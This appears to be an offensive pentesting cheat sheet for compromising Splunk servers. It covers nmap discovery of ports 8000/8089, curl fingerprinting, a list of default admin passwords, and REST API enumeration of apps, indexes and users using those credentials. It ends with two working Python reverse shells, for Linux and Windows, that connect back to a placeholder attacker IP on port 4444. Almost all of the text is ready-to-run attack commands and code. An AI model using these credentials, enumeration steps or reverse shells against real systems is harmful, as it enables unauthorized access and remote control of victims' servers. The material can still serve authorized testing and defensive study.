# Discovery
```powershell
# Full service scan targeting Splunk ports
sudo nmap -sV -p 8000,8089 <target>

# Broader scan — discover Splunk alongside other services
sudo nmap -sV <target>

8000/tcp open  ssl/http  Splunkd httpd
8089/tcp open  ssl/http  Splunkd httpd
```

# Web Fingerprint
```powershell
# Identify via HTTP headers / title
curl -sk https://<target>:8000 | grep -i splunk

# Check REST API endpoint (no auth required for version info in some configs)
curl -sk https://<target>:8089/services/server/info \
  -u admin:changeme | grep -i version
```

# Default Credentials
```powershell
admin:changeme
admin:admin
admin:Welcome1
admin:Password123
admin:splunk
```

# Enumeration
```powershell
# If Splunk Free is running, the dashboard loads without credentials
curl -sk https://<target>:8000/en-US/app/launcher/home
# Look for: 200 OK with no redirect to /en-US/account/login
```

# Browse REST API
```powershell
# List all apps installed
curl -sk https://<target>:8089/services/apps/local \
  -u admin:changeme

# Get server info (OS, Splunk version, hostname)
curl -sk https://<target>:8089/services/server/info \
  -u admin:changeme

# List all search jobs
curl -sk https://<target>:8089/services/search/jobs \
  -u admin:changeme

# Retrieve all indexes (data sources)
curl -sk https://<target>:8089/services/data/indexes \
  -u admin:changeme
```

# Enumerate Users
```powershell
curl -sk https://<target>:8089/services/authentication/users \
  -u admin:changeme
```

# Remote Code Execution
```powershell
# rev_shell.py
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
```
```
# rev_shell_win.py
import socket, subprocess

s = socket.socket()
s.connect(("<ATTACKER_IP>", 4444))
while True:
    cmd = s.recv(1024).decode()
    proc = subprocess.run(cmd, shell=True, capture_output=True)
    s.send(proc.stdout + proc.stderr)
```
